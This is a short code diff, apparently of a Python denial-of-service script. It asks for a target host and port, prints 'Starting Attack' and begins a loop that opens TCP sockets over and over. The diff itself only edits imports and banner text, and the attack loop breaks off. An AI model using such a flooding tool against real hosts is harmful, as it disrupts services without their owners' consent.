@@ -1,13 +1,12 @@
-import socket
+#!/usr/bin/python3
 import os
+import socket
 import sys
 import threading
 os.system("cls")
-print("Tools By Nessy")
 host = input("\nEnter host: ")
 port = int(input("\nEnter port: "))
-print("Starting Attack...")
-print("\n")
+print("Starting Attack....")
 def run(h):
     while True:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
